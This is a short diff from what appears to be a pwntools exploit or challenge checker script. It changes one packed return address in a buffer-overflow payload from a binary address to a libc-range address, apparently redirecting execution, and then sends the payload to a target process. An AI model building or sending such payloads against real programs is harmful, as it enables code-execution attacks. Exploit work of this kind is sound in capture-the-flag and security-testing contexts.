@@ -52,7 +52,7 @@ def check_3():
     c2_payload += pwn.p32(0x13371337)
     c2_payload += pwn.p64(0)
     c2_payload += pwn.p64(0x401334)
-    c2_payload += pwn.p64(0x4013fe)
+    c2_payload += pwn.p64(0x7ffff7e0ed0c)
     p.sendline(c2_payload)
     receve_input(p)
 
